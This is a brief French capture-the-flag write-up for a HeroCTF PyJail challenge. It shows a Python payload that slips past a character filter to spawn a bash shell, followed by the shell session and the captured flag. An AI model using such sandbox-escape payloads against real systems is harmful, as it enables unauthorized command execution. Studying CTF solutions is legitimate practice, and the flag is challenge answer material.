Pour ce 3ème PyJail, l'admin a bloqué l'utilisation de toutes les lettres !

On peut néanmoins bypass la regex comme ceci :
```bash
Enter your calcul below:
__import__('pty').spawn('/bin/bas'+chr(ord('h')))
pwnuser@e710bfd4a2be:~$ ls -al
ls -al
total 36
drwxr-xr-x 1 pwnflag pwnflag 4096 Apr 14 19:08 .
drwxr-xr-x 1 root    root    4096 Apr 12 22:21 ..
-rw-r--r-- 1 pwnuser pwnuser  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 pwnuser pwnuser 3789 Apr 12 22:21 .bashrc
-rw-r--r-- 1 pwnuser pwnuser  807 Apr  4  2018 .profile
-rwsr-xr-x 1 root    root     136 Apr 14 19:05 entry.sh
-rw-r--r-- 1 root    root      39 Apr 14 19:05 flag.txt
drwxr-xr-x 1 root    root    4096 Apr 14 19:08 programs
-rwsr-xr-x 1 pwnflag pwnflag 1061 Apr 14 19:05 shell.py
pwnuser@e710bfd4a2be:~$ cat flag.txt
cat flag.txt
HeroCTF{chr_w0rk_t00_t0_sp4wn_4_sh3ll}
```
HeroCTF{chr_w0rk_t00_t0_sp4wn_4_sh3ll}
